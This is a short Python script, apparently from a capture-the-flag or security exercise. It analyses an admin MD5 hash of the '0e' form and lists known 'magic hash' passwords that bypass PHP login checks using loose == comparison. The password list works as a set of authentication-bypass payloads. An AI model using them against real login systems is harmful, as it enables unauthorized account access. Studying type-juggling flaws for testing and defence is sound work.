import hashlib

# Analysis of admin hash
admin_hash = "0e678703625362188185747119782643"
print(f"Admin hash: {admin_hash}")
print(f"Length: {len(admin_hash)}")
print(f"Starts with 0e: {admin_hash.startswith('0e')}")
print(f"All digits after 0e: {admin_hash[2:].isdigit()}")
print(f"Valid MD5: {len(admin_hash) == 32}")
print()

# Known MD5 magic hashes (0e + digits)
magic_passwords = {
    "240610708": "0e462097431906509019562988736854",
    "QNKCDZO": "0e830400451993494058024219903391",
    "aabg7XSs": "0e087386482136013740957780965295",
    "aabC9RqS": "0e041022518165728065344349536299",
    "s878926199a": "0e545993274517709034328855841020",
    "s155964671a": "0e342768416822451524974117254469",
    "s214587387a": "0e848240448830537924465865611904",
    "s1091221200a": "0e399584290069820987035018271304",
    "s1885207154a": "0e509367213418206700842008763514",
    "s1502113478a": "0e861580430291253726094265009191",
    "s1836677006a": "0e481036490867661113260034900752",
    "s1184209335a": "0e072485820392773389074313648581",
    "s1665632922a": "0e731198061491163073197128363787"
}

print("Known magic hash passwords:")
match_found = False
for pwd, hash_val in magic_passwords.items():
    print(f"  {pwd:20s} -> {hash_val}")
    if hash_val == admin_hash:
        print(f"  *** MATCH FOUND: {pwd} ***")
        match_found = True

print()
print(f"Total passwords: {len(magic_passwords)}")
print(f"Exact match: {match_found}")
print()

if not match_found:
    print("Vulnerability: If PHP uses == comparison, ANY of these passwords will work!")
    print("The admin hash is interpreted as 0 (zero) in scientific notation.")
    print("All these hashes also equal 0, so they all match during authentication.")
